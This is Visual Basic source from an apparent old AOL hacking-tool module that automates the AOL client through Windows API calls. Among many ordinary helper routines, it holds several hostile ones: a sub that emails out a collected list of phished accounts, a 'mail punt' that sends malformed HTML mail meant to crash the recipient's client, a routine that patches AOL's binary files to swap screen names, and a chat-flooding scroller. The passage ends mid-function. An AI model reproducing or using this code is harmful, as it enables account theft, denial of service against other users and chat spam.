Sub IXI_List_Save(FilEneRm As String, extenZion As String, List1 As ListBox, cmdialog1 As Control, picture1 As PictureBox, text12 As TextBox, text1 As TextBox)
On Error Resume Next
cmdialog1.Filter = FilEneRm$ + " (*." + extenZion$ + ")|*." + extenZion$ + "|"
cmdialog1.FilterIndex = 1
cmdialog1.Action = 2
Open cmdialog1.FileName For Output As #1
If cmdialog1.FileName = "" Then GoTo dick
If cmdialog1.FileName = "*.*" Then GoTo dick
If cmdialog1.FileName = "*." + extenZion$ Then GoTo dick
Close #1
If cmdialog1.FileName = "" Then GoTo dick
If cmdialog1.FileName = "*.*" Then GoTo dick
If cmdialog1.FileName = "*." + extenZion$ Then GoTo dick
Dim b As Variant
FF$ = List1.listcount
fg$ = "0"
If InStr(cmdialog1.FileName, extenZion$) Then GoTo nju Else cmdialog1.FileName = cmdialog1.FileName + "." + cmdialog1.FileName
nju:
Open (cmdialog1.FileName) For Output As #1
b = 0
Do While b < List1.listcount
Print #1, List1.list(b)
fg$ = fg$ + 1
Call PercentBar(picture1, fg$, FF$)
TimeOut (0.000000000000001)
b = b + 1
Loop
dick:
TimeOut (0.000000000000001)
Close #1
TimeOut (0.000000000000001)
Call Percent_reseT(picture1)
End Sub



Sub LizT_RemoveItem(lst As Control)
'ouwop
lst.RemoveItem lst.ListIndex
End Sub

Function MSG_Yes_Cancel(proMpt As String, tiTle As String)
'ouwop
If MsgBox(proMpt$, 1, tiTle$) = 1 Then
MSG_Yes_Cancel = 1
Else
MSG_Yes_Cancel = 0
End If
End Function


Function MsG_A_R_I(proMpt As String, tiTle As String)
'ouwop
d$ = MsgBox(proMpt$, 2, tiTle$)
If d$ = 3 Then MsG_A_R_I = "abort": Exit Function
If d$ = 4 Then MsG_A_R_I = "retry": Exit Function
If d$ = 5 Then MsG_A_R_I = "ignore": Exit Function
MsG_A_R_I = ""
End Function
Function MsG_Y_N_C(proMpt As String, tiTle As String)
'ouwop
d$ = MsgBox(proMpt$, 3, tiTle$)
If d$ = 6 Then MsG_Y_N_C = "yes": Exit Function
If d$ = 7 Then MsG_Y_N_C = "no": Exit Function
If d$ = 8 Then MsG_Y_N_C = "cancel": Exit Function
MsG_Y_N_C = ""
End Function
Function MsG_Err_Y_N_C(proMpt As String, tiTle As String)
'ouwop
d$ = MsgBox(proMpt$, 19, tiTle$)
If d$ = 6 Then MsG_Err_Y_N_C = "yes": Exit Function
If d$ = 7 Then MsG_Err_Y_N_C = "no": Exit Function
If d$ = 8 Then MsG_Err_Y_N_C = "cancel": Exit Function
MsG_Err_Y_N_C = ""
End Function
Function MSG_Exlamation(proMpt As String, tiTle As String)
'ouwop
MsgBox proMpt$, 64, tiTle$
End Function


Function MsG_error(proMpt As String, tiTle As String)
'ouwop
MsgBox proMpt$, 16, tiTle$
End Function
Function MsG_R_C(proMpt As String, tiTle As String)
'ouwop
d$ = MsgBox(proMpt$, 5, tiTle$)
If d$ = 4 Then MsG_R_C = "retry": Exit Function
If d$ = 5 Then MsG_R_C = "cancel": Exit Function
MsG_R_C = ""
End Function
Function Not_Room_Cchat()
'ouwop
If FindRoom Then
Not_Room_Cchat = 1
Else
Not_Room_Cchat = 0
End If
End Function

Sub Phish_SendList_Email(label4 As Label, picture1 As PictureBox, txt3, List1 As ListBox)
If IsUserOnline = 0 Then
MsgBox "Not Online!", vbCritical, "ERROR!"
Else
FF$ = List1.listcount
fg$ = "0"
For X = 0 To List1.listcount - 1
fg$ = fg$ + 1
Call PercentBar(picture1, fg$, FF$)
TimeOut (0.000000000000001)
txt3.Text = txt3.Text & Chr(13) & List1.list(X) & "" & Chr(13)
Next X
Call Percent_reseT(picture1)
Dim sPrompt As String 'Local variable...
Static iXPos As Integer, iYPos As Integer 'Value maintained between calls...''

sPrompt = "Enta The Email Address to Send your Lizt Of <>< To.."  'Set the prompt...
iXPos = IIf(iXPos > 4000, 0, 0) 'Change windows location...
iXPos = IIf(iYPos > 4000, 0, 0) 'If() Covered next chapter...
snamePW$ = "" + InputBox$(sPrompt, "Email addrezz to send theze to....", , iXPos, iYPos)   'Display box, get input
If snamePW$ = "" Then
Else
dater$ = Date
Call senDmail(snamePW$, "IXI <>< B0wL [" + label4.caption + "] Phishez!", label4.caption + " Phishez Sent to you by: " + frmMAIN.LBLUZER.caption & Chr(10) + " -On: " + dater$ & Chr(10) & Chr(10) & txt3)
End If
End If
End Sub

Sub Pr(room)
'ouwop
Call MazTa_KW("aol://2719:2-2-" & room)
End Sub

Sub TOSemail_IM(Person As String, phRaZe As String)
Call MazTa_SendMail("TOSIM1", "help", "<font size=2 color=#0000ff><b>" & Person & ":</b></font>    <font size=3 color=#000000>" & phRaZe & "</font>")
End Sub

Function convertseconds(Text) As String
Dim Min As Integer
Min = 0
Do While Text > 60
Min = Min + 1
Text = Text - 59
Loop
sec$ = Trim(Str$(Text - Min))
sec$ = String(2 - Len(sec$), "0") + sec$
convertseconds = Min & ":" + sec$
End Function

Sub NEW_User2(sn As String, AOLDir As String, replace As String)
sn$ = sn$ + String(16 - Len(sn$), Chr(32))
replace$ = replace$ + String(16 - Len(replace$), Chr(32))
free = FreeFile
On Error Resume Next
Open AOLDir$ For Binary As #free
If Err = 76 Then
MsgBox "Invalid Directory Chozen!", vbCritical, "err0r!"
Exit Sub
Close #1
End If
For X = 1 To LOF(free) Step 32000
DoEvents
Text$ = Space(32000)
Get #1, X, Text$
Search:
If InStr(1, Text$, sn$, 1) Then
    Where = InStr(1, Text$, sn$, 1)
    Put #free, (X + Where) - 1, replace$
    Mid$(Text$, Where, 16) = String(16, " ")
    GoTo Search
End If
Next X
Close #1
Call ShowSignOn
Call AOL25_ShowSignOn
Call AOLUK_ShowSignOn
MsgBox "Screen Name Set From to NEWUSER Succesfully!", 64, "Success!"
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
chil% = FindChildByClass(MDI%, "AOL Child")
Combo% = FindChildByClass(chil%, "_AOL_Combobox")
lis% = FindChildByClass(chil%, "_AOL_Listbox")
gly% = FindChildByClass(chil%, "_AOL_Glyph")
icona% = FindChildByClass(chil%, "_AOL_Icon")
Rich% = FindChildByClass(chil%, "RICHCNTL")
stat% = FindChildByClass(chil%, "_AOL_Static")
stat2% = GetWindow(stat%, GW_HWNDNEXT)
stat3% = GetWindow(stat2%, GW_HWNDNEXT)
stat4% = GetWindow(stat3%, GW_HWNDNEXT)
Do
DoEvents:
TimeOut (0.1)
Loop Until FindSignOnScreen& <> 0 Or AOL25_FindSignOnScreeN <> 0& Or AOLUK_FindSignOnScreeN <> 0&
AppActivate "ouwop online"
TimeOut (0.6)
SetText stat%, "IXI"
SetText stat2%, "IXI"
SetText stat3%, "IXI"
SetText stat4%, "IXI"
Call GuestClickSignOn
Call AOL25_GuestClickSignOn
End Sub

Sub Scroll(IXI As String)
'ouwopz dick
If IXI = "" Then Exit Sub
a = String(116, Chr(32))
d = 116 - Len(IXI)
c$ = Left(a, d)
If izRoomPrivate Then
If IXI = "ixi" Then IXI = "IXI"
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
TimeOut (0.3)
Call XAOL4_OpenPR(XAOL4_GetCurrentRoomName)
TimeOut (0.3)
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
TimeOut (0.3)
Call XAOL4_OpenPR(XAOL4_GetCurrentRoomName)
TimeOut (0.3)
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
TimeOut (2)
Else
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
TimeOut (0.3)
Call XAOL4_OpenPR(Room_URL)
TimeOut (0.3)
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
TimeOut (0.3)
Call XAOL4_OpenPR(Room_URL)
TimeOut (0.3)
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
sendchat2 "" + IXI + "" & c$ & "" + IXI + ""
TimeOut (0.3)
Call XAOL4_OpenPR(Room_URL)
TimeOut (0.3)
TimeOut (2)
End If
End Sub


Sub SelectALL(a As TextBox)
a.SetFocus
a.SelStart = 0
a.SelLength = Len(a.Text)
End Sub
Sub AOL4_AddBuddyList(Who As String)
Dim EditBuddyWin As Long, AOL As Long, AOMDI As Long
Dim Bud1 As Long, Bud2 As Long, EditBut As Long
Dim PutSnWin As Long, PutSnCombo As Long, PutSnStatic As Long
Dim PutSnEdit As Long, PutSnGlyph As Long, PutSnIcon As Long
Dim PutSnList As Long, DaSnWin As Long, SetSn As Long
Dim SaveBud As Long, HitDaOk As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
AOMDI& = FindWindowEx(AOL, 0, "MDIClient", vbNullString)
Call XAOL4_Keyword("buddylist")
Do
DoEvents
Bud1& = FindWindowEx(AOMDI&, 0, "AOL Child", getuser() + "'s Buddy Lists")
Bud2& = FindWindowEx(AOMDI&, 0, "AOL Child", getuser() + "'s Buddy List")
If Bud1& <> 0 Then
EditBuddyWin& = Bud1&
Exit Do
End If
If Bud2& <> 0 Then
EditBuddyWin& = Bud2&
Exit Do
End If
Loop
DoEvents
Do
DoEvents
EditBut& = FindWindowEx(EditBuddyWin&, 0, "_AOL_Icon", vbNullString)
EditBut& = FindWindowEx(EditBuddyWin&, EditBut&, "_AOL_Icon", vbNullString)
If EditBut& Then Exit Do
Loop
DoEvents
Call PostMessage(EditBut&, WM_LBUTTONDOWN, 0, 0)
Call PostMessage(EditBut&, WM_LBUTTONUP, 0, 0)
DoEvents
Do
DoEvents
PutSnWin& = FindWindowEx(AOMDI&, 0, "AOL Child", vbNullString)
PutSnList& = FindWindowEx(PutSnWin&, 0, "_AOL_Listbox", vbNullString)
PutSnCombo& = FindWindowEx(PutSnWin&, 0, "_AOL_Combobox", vbNullString)
PutSnGlyph& = FindWindowEx(PutSnWin&, 0, "_AOL_Glyph", vbNullString)
PutSnIcon& = FindWindowEx(PutSnWin&, 0, "_AOL_Icon", vbNullString)
PutSnStatic& = FindWindowEx(PutSnWin&, 0, "_AOL_Static", vbNullString)
PutSnEdit& = FindWindowEx(PutSnWin&, 0, "_AOL_Edit", vbNullString)
If PutSnCombo& And PutSnEdit& Then
DaSnWin& = PutSnWin&
Exit Do
End If
Loop
Call TimeOut(0.5)
SetSn& = FindWindowEx(DaSnWin&, 0, "_Aol_Edit", vbNullString)
SetSn& = FindWindowEx(DaSnWin&, SetSn&, "_Aol_Edit", vbNullString)
Call SendMessageByString(SetSn&, WM_SETTEXT, 0&, Who)
DoEvents
Call SendMessageByString(SetSn&, WM_CHAR, ENTER_KEY, 0)
Call TimeOut(0.5)
SaveBud& = FindWindowEx(DaSnWin&, 0, "_AOL_Icon", vbNullString)
SaveBud& = FindWindowEx(DaSnWin&, SaveBud&, "_AOL_Icon", vbNullString)
SaveBud& = FindWindowEx(DaSnWin&, SaveBud&, "_AOL_Icon", vbNullString)
Call PostMessage(SaveBud&, WM_LBUTTONDOWN, 0, 0)
Call PostMessage(SaveBud&, WM_LBUTTONUP, 0, 0)
For HitDaOk& = 1 To 20
Call TimeOut(0.1)
'Call waitforok
Call ClicK_OK("America Online")
Next HitDaOk
DoEvents
Call AOL4_KillWin(EditBuddyWin&)
Call AOL4_KillWin(Bud&)
Call AOL4_KillWin(Bud2&)

End Sub


Sub AOL_SwitchSN()
'ouwop
Call runaolmenu(3&, 0&)
End Sub

Function GetDay() As String
'ouwop
GetDay$ = Format$(Now, "dddd")
If GetDay$ = "Sunday" Then GetDay$ = "sunday"
If GetDay$ = "Monday" Then GetDay$ = "Munday"
If GetDay$ = "Tuesday" Then GetDay$ = "Tuezday"
If GetDay$ = "Wednesday" Then GetDay$ = "Wenzday"
If GetDay$ = "Thursday" Then GetDay$ = "Thurzday"
If GetDay$ = "Friday" Then GetDay$ = "Friday"
If GetDay$ = "Saturday" Then GetDay$ = "Satuhday"
If GetDay$ = "" Then GetDay$ = "[unknown]"
End Function

Sub FILEreadOnly(TheFile As String)
Dim file As String
file$ = dir(TheFile$)
If file$ <> "" Then SetAttr TheFile$, vbReadOnly
End Sub

Function FaDe(Color1 As String, color2 As String, Text As String)
Dim aa, cc, dd, ee, c, f, g, l As String
Dim d, e, h, i, J, k As Integer
c = Text + "             "
h = Len(c)
d = (h / 6)
If d < 1 Then d = 1
e = 1
f = ""
i = h / d
J = 1
Do
ee = "00"
cc = "00"
dd = "00"
aa = Color1
If aa = "red" Then
    If J = 1 Then
        cc = "00"
    ElseIf J = 2 Then
        cc = "33"
    ElseIf J = 3 Then
        cc = "66"
    ElseIf J = 4 Then
        cc = "88"
    ElseIf J = 5 Then
        cc = "AA"
    ElseIf J = 6 Then
        cc = "CC"
    End If
ElseIf aa = "blue" Then
    If J = 1 Then
        ee = "CC"
    ElseIf J = 2 Then
        ee = "AA"
    ElseIf J = 3 Then
        ee = "88"
    ElseIf J = 4 Then
        ee = "66"
    ElseIf J = 5 Then
        ee = "33"
    ElseIf J = 6 Then
        ee = "00"
    End If
ElseIf aa = "green" Then
    If J = 1 Then
        dd = "CC"
    ElseIf J = 2 Then
        dd = "AA"
    ElseIf J = 3 Then
        dd = "88"
    ElseIf J = 4 Then
        dd = "66"
    ElseIf J = 5 Then
        dd = "33"
    ElseIf J = 6 Then
        dd = "00"
    End If
ElseIf aa = "gold" Then
    If J = 1 Then
        cc = "CC"
        dd = "CC"
    ElseIf J = 2 Then
        cc = "AA"
        dd = "AA"
    ElseIf J = 3 Then
        cc = "88"
        dd = "88"
    ElseIf J = 4 Then
        cc = "66"
        dd = "66"
    ElseIf J = 5 Then
        cc = "33"
        dd = "33"
    ElseIf J = 6 Then
        cc = "00"
        dd = "00"
    End If
ElseIf aa = "purple" Then
    If J = 1 Then
        cc = "CC"
        ee = "CC"
    ElseIf J = 2 Then
        cc = "AA"
        ee = "AA"
    ElseIf J = 3 Then
        cc = "88"
        ee = "88"
    ElseIf J = 4 Then
        cc = "66"
        ee = "66"
    ElseIf J = 5 Then
        cc = "33"
        ee = "33"
    ElseIf J = 6 Then
        cc = "00"
        ee = "00"
    End If
ElseIf aa = "green" Then
    If J = 1 Then
        dd = "CC"
    ElseIf J = 2 Then
        dd = "AA"
    ElseIf J = 3 Then
        dd = "88"
    ElseIf J = 4 Then
        dd = "66"
    ElseIf J = 5 Then
        dd = "33"
    ElseIf J = 6 Then
        dd = "00"
    End If
End If
aa = color2
If aa = "red" Then
    If J = 1 Then
        cc = "00"
    ElseIf J = 2 Then
        cc = "33"
    ElseIf J = 3 Then
        cc = "66"
    ElseIf J = 4 Then
        cc = "88"
    ElseIf J = 5 Then
        cc = "AA"
    ElseIf J = 6 Then
        cc = "CC"
    End If
ElseIf aa = "blue" Then
    If J = 1 Then
        ee = "00"
    ElseIf J = 2 Then
        ee = "33"
    ElseIf J = 3 Then
        ee = "66"
    ElseIf J = 4 Then
        ee = "88"
    ElseIf J = 5 Then
        ee = "AA"
    ElseIf J = 6 Then
        ee = "CC"
    End If
ElseIf aa = "green" Then
    If J = 1 Then
        dd = "00"
    ElseIf J = 2 Then
        dd = "33"
    ElseIf J = 3 Then
        dd = "66"
    ElseIf J = 4 Then
        dd = "88"
    ElseIf J = 5 Then
        dd = "AA"
    ElseIf J = 6 Then
        dd = "CC"
    End If
ElseIf aa = "gold" Then
    If J = 1 Then
        cc = "00"
        dd = "00"
    ElseIf J = 2 Then
        cc = "33"
        dd = "33"
    ElseIf J = 3 Then
        cc = "66"
        dd = "66"
    ElseIf J = 4 Then
        cc = "88"
        dd = "88"
    ElseIf J = 5 Then
        cc = "AA"
        dd = "AA"
    ElseIf J = 6 Then
        cc = "CC"
        dd = "CC"
    End If
ElseIf aa = "purple" Then
    If J = 1 Then
        cc = "00"
        ee = "00"
    ElseIf J = 2 Then
        cc = "33"
        ee = "33"
    ElseIf J = 3 Then
        cc = "66"
        ee = "66"
    ElseIf J = 4 Then
        cc = "88"
        ee = "88"
    ElseIf J = 5 Then
        cc = "AA"
        ee = "AA"
    ElseIf J = 6 Then
        cc = "CC"
        ee = "CC"
    End If
ElseIf aa = "green" Then
    If J = 1 Then
        dd = "00"
    ElseIf J = 2 Then
        dd = "33"
    ElseIf J = 3 Then
        dd = "66"
    ElseIf J = 4 Then
        dd = "88"
    ElseIf J = 5 Then
        dd = "AA"
    ElseIf J = 6 Then
        dd = "CC"
    End If
End If
    g = cc & dd & ee
    k = (e + d - 1)
    If J = 6 Then k = h
    
    l = Left(c, k)
   
   f = f + ("<font color=""#" & g & """>") + Mid(l, e)
    e = (e + d)
    J = J + 1
Loop Until J = 6
FaDe = f
End Function


Sub ie_goURL(Where As String)
'ouwop
ie% = FindWindow("ieframe", vbNullString)
oki% = FindChildByClass(ie%, "workerA")
okie% = FindChildByClass(oki%, "ReBarWindow32")
okie% = FindChildByClass(okie%, "toolbarwindow32")
okie% = GetWindow(okie%, GW_HWNDNEXT)
Call SendMessageByString(okie%, WM_SETTEXT, 0, Where$)
TimeOut (0.0000001)
Call SendMessageByNum(okie%, WM_CHAR, 13, 0)
End Sub

Function ie_mdi()
'ouwop
ie% = FindWindow("ieframe", vbNullString)
If ie% Then
ie_mdi = 1
Else
ie_mdi = 0
End If
End Function
Function ie_caption()
'ouwop
ie% = FindWindow("ieframe", vbNullString)
If ie% Then
ie_caption = gettext(ie%)
Else
ie_caption = "[cant find ie window]"
End If
End Function
Function ie_Changecaption(NewCaption As String)
'ouwop
ie% = FindWindow("ieframe", vbNullString)
If ie% Then
SetText ie%, NewCaption$
Else

End If
End Function
Function ie_kloze()
'ouwop
ie% = FindWindow("ieframe", vbNullString)
If ie% Then
Call AOL4_KillWin(ie%)
Else

End If
End Function
Sub ie_hide()
'ouwop
ie% = FindWindow("ieframe", vbNullString)
If ie% Then
HideIt& = ShowWindow(ie%, SW_HIDE)
Else
End If
End Sub
Sub ie_show()
'ouwop
ie% = FindWindow("ieframe", vbNullString)
If ie% Then
HideIt& = ShowWindow(ie%, SW_SHOW)
Else
End If
End Sub



Sub WriTe_NotePad(txt As String)
'ouwop
X = Shell("Notepad.exe", 1)
If Err Then MsgBox "Cannot Find ""c:\windows\notepad.exe"",16:exit sub"
Do
DoEvents:
win% = FindWindow("Notepad", "Untitled - Notepad")
Loop Until win% <> 0
edt% = FindWindowEx(win%, 0&, "Edit", vbNullString)
SetText edt%, txt$
s = ShowWindow(win%, SW_RESTORE)
End Sub
Function AOL50_FindRoom() As Long
Dim MDI As Long, window As Long, room As Long
Dim Rich As Long, AOLList As Long
Dim AolIcon As Long, AolStatic As Long
MDI& = AolMdi
window& = FindWindowEx(MDI&, 0, "AOL Child", vbNullString)
Rich = FindWindowEx(window&, 0, "RICHCNTL", vbNullString)
AOLList& = FindWindowEx(window&, 0, "_AOL_Listbox", vbNullString)
AolIcon& = FindWindowEx(window&, 0, "_AOL_icon", vbNullString)
AolStatic& = FindWindowEx(window&, 0, "_AOL_Static", vbNullString)
If Rich& <> 0 And AOLList& <> 0 And AolIcon& <> 0 And AolStatic& <> 0 Then
room& = window
Else
End If
Do While window& <> 0
window& = FindWindowEx(MDI&, window&, "AOL Child", vbNullString)
Rich = FindWindowEx(window&, 0, "RICHCNTL", vbNullString)
AOLList& = FindWindowEx(window&, 0, "_AOL_Listbox", vbNullString)
AolIcon& = FindWindowEx(window&, 0, "_AOL_icon", vbNullString)
AolStatic& = FindWindowEx(window&, 0, "_AOL_Static", vbNullString)
If Rich& <> 0 And AOLList& <> 0 And AolIcon& <> 0 And AolStatic& <> 0 Then
room& = window
Else
End If
Loop
AOL50_FindRoom& = room&
End Function
Function AOL50_RoomName() As String
If getuser = "" Then Exit Function
Dim room As Long, caption As String, Length As Long
room = AOL50_FindRoom
Length& = GetWindowTextLength(room&)
caption$ = String(Length&, 0)
Call GetWindowText(room&, caption$, Length& + 1)
AOL50_RoomName$ = caption$
End Function
Function FindAOL() As Long
Dim AOL As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
FindAOL& = AOL&
End Function
Public Sub AOl50_Sendmail(Person As String, subject As String, message As String)
If getuser = "" Then Exit Sub
Dim MDI As Long, mail As Long, text1 As Long, Text2 As Long
Dim RichCntl As Long, AOL As Long, Toolbar As Long
Dim icon As Long
MDI& = AolMdi
AOL& = FindAOL
Toolbar& = FindWindowEx(AOL&, 0, "AOL Toolbar", vbNullString)
Toolbar& = FindWindowEx(Toolbar&, 0, "_AOL_Toolbar", vbNullString)
icon& = FindWindowEx(Toolbar&, 0, "_AOL_Icon", vbNullString)
icon& = FindWindowEx(Toolbar&, icon&, "_AOL_Icon", vbNullString)
Call PostMessage(icon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(icon&, WM_LBUTTONUP, 0&, 0&)
Do
mail& = FindWindowEx(MDI&, 0, "AOL Child", "Write Mail")
TimeOut 0.1
Loop Until mail& <> 0
Do
text1& = FindWindowEx(mail&, 0, "_AOL_Edit", vbNullString)
Text2& = FindWindowEx(mail&, text1, "_AOL_Edit", vbNullString)
Text2& = FindWindowEx(mail&, Text2, "_AOL_Edit", vbNullString)
RichCntl& = FindWindowEx(mail&, 0, "RICHCNTL", vbNullString)
Loop Until text1 <> 0 And Text2 <> 0 And RichCntl <> 0
TextToText Person, text1
TextToText subject, Text2
TextToText message, RichCntl
Dim RichText As String
Do
RichText = gettext(RichCntl)
TimeOut 0.15
Loop Until RichText <> "" Or message = ""
Dim Counter As Long
icon& = FindWindowEx(mail&, 0, "_AOL_Icon", vbNullString)
Do
icon& = FindWindowEx(mail&, icon&, "_AOL_Icon", vbNullString)
Counter = Counter + 1
Loop Until Counter = 15
cLickiCoN (icon&)
TimeOut 0.4
HideWindow mail&
End Sub
Public Sub TextToText(Text As String, Handle As Long)
'shiek
Call SendMessageByString(Handle&, WM_SETTEXT, 0, Text)
End Sub

Sub AOL_MAilPunT(Who As String)
'ouwop
Call MazTa_SendMail(Who$, ";]", "<HTML><IMG  SRC=""Tiles.exe"" ID=999999999999999999999999999999999999999999999999999999999999999999999999999999999999999"" WIDTH=""1"" HEIGHT=""1"" BORDER=""0"" DATASIZE=""1000""><IMG  SRC=""Niles.exe"" ID=""0 WIDTH=""1"" HEIGHT=""1"" BORDER=""0"" DATASIZE=""1000""><IMG  SRC=")
End Sub

Sub macro_wowlamE()
sendchat "        __/)"
TimeOut (0.00000001)
sendchat "      _/   ¯¯',"
TimeOut (0.00000001)
sendchat "      _____,'    some kidz takin shit on aol"
TimeOut (2)
End Sub


Function SNDecoder(name As String)
'ouwop
For X = 1 To Len(name)
letta$ = Mid(name, X, 1)
If letta$ = "l" Then Let letta$ = "L": GoTo Done
If letta$ = "O" Then Let letta$ = "o": GoTo Done
If letta$ = "I" Then Let letta$ = "i": GoTo Done
If letta$ = "V" Then Let letta$ = "v ": GoTo Done
Done:
i$ = i$ & letta$
Next X
If MazTa_FindroOm Then
f$ = ASCII_Random
Call sendchat(f$ + " <B>S</b>creen <B>N</b>ame <b>D</b>ecoder")
waiT (0.1)
Call sendchat(f$ + " <B>N</b>ow <u>d</u>ecoding <i>" & name)
waiT (0.1)
Call sendchat(f$ + " <i>" + name & "</i> = <u>" & i$)
TimeOut (2)
Else
MsgBox (i$)
End If
End Function
Function decoDe_TXT(name)
'ouwop
For X = 1 To Len(name)
letta$ = Mid(name, X, 1)
If letta$ = "l" Then Let letta$ = "L": GoTo Done
If letta$ = "O" Then Let letta$ = "o": GoTo Done
If letta$ = "I" Then Let letta$ = "i": GoTo Done
If letta$ = "V" Then Let letta$ = "v ": GoTo Done
Done:
i$ = i$ & letta$
Next X
decoDe_TXT = i$
End Function
Function FileLength2(Path)
X = FileLen(Path)
FileLength2 = X
End Function
Sub BOT_CUZz()
'ouwop.bas
'http://www.geocities.com\ouwop
terp:
TimeOut (0.000000000000001)
Who$ = SNFromLastChatLine
rr$ = LCase(LastChatLine)
If Who$ = getuzer Then GoTo terp Else GoTo okie
If Who$ = "OnlineHost" Then GoTo terp Else GoTo okie
okie:
If InStr(rr$, LCase("bitch")) Then Call sendchat(Who$ + Phraze_CuzZ): TimeOut (0.4)
If InStr(rr$, LCase("fuck")) Then Call sendchat(Who$ + Phraze_CuzZ): TimeOut (0.4)
If InStr(rr$, LCase("dick")) Then Call sendchat(Who$ + Phraze_CuzZ): TimeOut (0.4)
If InStr(rr$, LCase("ass")) Then Call sendchat(Who$ + Phraze_CuzZ): TimeOut (0.4)
If InStr(rr$, LCase("pussy")) Then Call sendchat(Who$ + Phraze_CuzZ): TimeOut (0.4)
If InStr(rr$, LCase("damn")) Then Call sendchat(Who$ + Phraze_CuzZ): TimeOut (0.4)
If InStr(rr$, LCase("shit")) Then Call sendchat(Who$ + Phraze_CuzZ): TimeOut (0.4)
If InStr(rr$, LCase("piss")) Then Call sendchat(Who$ + Phraze_CuzZ): TimeOut (0.4)
GoTo terp
End Sub
Function Phraze_CuzZ()
'ouwop
    Dim phRaZe
    Randomize
    phRaZe = Int(5 * Rnd + 1)
'    If phraze = 1 Then Phraze_CuzZ = ""
    If phRaZe = 1 Then Phraze_CuzZ = ", watch your mouth!"
    If phRaZe = 2 Then Phraze_CuzZ = ", Stop the Vulgarnizz!"
    If phRaZe = 3 Then Phraze_CuzZ = ", Therez Children Prezent!"
    If phRaZe = 4 Then Phraze_CuzZ = ", Reported!"
    If phRaZe = 5 Then Phraze_CuzZ = ", You talk to yo momz wit dat mouth?"
    

End Function

Sub AOL25_Addroom(list As Control)
'ouwop
'only working addroom sub for vb4 aol25 << dat i know uv >>
'[ouwop]
a% = FindChildByClass(AOL25_FindroOm(), "_AOL_Listbox")
b% = SendMessageByNum(a%, LB_GETCOUNT, 0, 0&)
For g% = 0 To b% - 1
c% = SendMessageByNum(a%, LB_SETCURSEL, g%, 0&)
d% = SendMessageByNum(a%, WM_LBUTTONDBLCLK, 0, 0&)
Do: DoEvents
e% = FindChildByClass(AolMdi(), "AOL Child")
f% = FindChildByTitle(e%, "Message")
Loop Until f% <> 0
If gettext(e%) = getuser() Then GoTo na
list.AddItem gettext(e%)
na:
AOL4_KillWin e%
Next g%
    'b% = SendMessage(a%, LB_GETCOUNT, 0, 0)
    'For intLoop% = 0 To b% - 1
    'lLength& = SendMessage(a%, LB_GETTEXTLEN, intLoop%, 0)
    'lEmptyT$ = String(lLength&, " ")
    'lFullTe$ = SendMessageByString(a%, LB_GETTEXT, intLoop%, lEmptyT$)
    'lTab& = InStr(lEmptyT$, Chr(9)) 'Find Tab.
    'sName$ = Right$(lEmptyT$, Len(lEmptyT$) - lTab&)
    'lTab& = InStr(sName$, Chr(9))
    'sText$ = Right$(sName$, Len(sName$) - lTab&)
    'sname2$ = sText$
    'list.AddItem (sname2$)
    'Next intLoop%
End Sub





Function Check_RateLimiT()
'ouwop
'checkz to see if the rate limit on buztin chat roomz iz up
'ao2/4/5
okwin% = FindWindow("#32770", "America Online")
e2 = FindChildByClass(okwin%, "Static")
e2 = GetWindow(e2, GW_HWNDNEXT)
okwinmsgmsg$ = gettext(e2)
Clipboard.SetText okwinmsgmsg$
If okwinmsgmsg$ = "You've changed chat rooms too quickly.  Please reduce the rate at which you change chat rooms." Then
Check_RateLimiT = 1
Else
Check_RateLimiT = 0
End If

End Function
Function Check_PRfull()
'ouwop
'checkz to see if the room iz full in PR
'ao2/4/5
okwin% = FindWindow("#32770", "America Online")
e2 = FindChildByClass(okwin%, "Static")
e2 = GetWindow(e2, GW_HWNDNEXT)
okwinmsgmsg$ = gettext(e2)
Clipboard.SetText okwinmsgmsg$
If okwinmsgmsg$ = "The room you requested is full" Then
Check_PRfull = 1
Else
Check_PRfull = 0
End If

End Function

Function Check_NoMatchez()
'ouwop
'checkz to see if the room iz full in PR
'ao2/4/5
okwin% = FindWindow("#32770", "America Online")
e2 = FindChildByClass(okwin%, "Static")
e2 = GetWindow(e2, GW_HWNDNEXT)
okwinmsgmsg$ = gettext(e2)
If okwinmsgmsg$ = "No profiles were found that match what you entered." Then
Check_NoMatchez = 1
Else
Check_NoMatchez = 0
End If

End Function

Public Sub enableaoltoolbar()
'izekial
      Dim lngaol As Long, lngmdi As Long, lngtoolbar As Long, lngicon As Long
    Dim Index As Long, lngcombo As Long
    Let lngaol& = FindWindow("AOL Frame25", vbNullString)
    Let lngmdi& = FindWindowEx(lngaol&, 0&, "mdiclient", vbNullString)
    Let lngtoolbar& = FindWindowEx(lngaol&, 0&, "AOL Toolbar", vbNullString)
    Call EnableWindow(lngtoolbar&, True)
    Let lngtoolbar& = FindWindowEx(lngtoolbar&, 0&, "_AOL_Toolbar", vbNullString)
    Call EnableWindow(lngtoolbar&, True)
    Let lngicon& = FindWindowEx(lngtoolbar&, 0&, "_AOL_Icon", vbNullString)
    Call EnableWindow(lngicon&, True)
      Let lngicon2& = FindWindowEx(lngtoolbar&, 0&, "_AOL_ComboBox", vbNullString)
